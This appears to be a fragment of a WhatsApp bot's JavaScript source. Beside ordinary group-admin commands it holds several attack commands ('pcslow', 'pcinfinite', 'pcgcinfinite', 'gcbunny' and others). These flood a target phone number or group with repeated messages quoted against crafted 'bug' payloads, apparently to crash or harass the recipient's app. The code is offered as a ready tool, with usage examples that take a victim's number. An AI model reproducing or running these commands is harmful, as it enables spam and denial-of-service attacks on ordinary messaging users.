...
detectLinks: false,
	...
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./SohanMedia/theme/mathiya.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
...
case 'group': case 'grup': {
                ...
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Successfully Closed The Group☑️*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Successfully Opened The Group☑️*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
            ...
            case 'editinfo': {
                ...
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info☑️*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info☑️*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
...
case 'pcslow': { 
            ...
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:xeonyh1})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pmgcmassxeon})
         ...
         case 'gcslow':               
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcmassxeon})
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:gcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            ...
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheeshaa☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Sohan Matheesha☣️"},{quoted:pcgcinfinitexeon})
            break
case 'gcbunny': {            
...
for (let i = 0; i < amount; i++) {
kwkwkx = '``😈Bug By Sohan😈 ``',
XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Sohan Matheesha☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
...
XeonBotInc.sendText(m.chat, `Sohan☣️`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
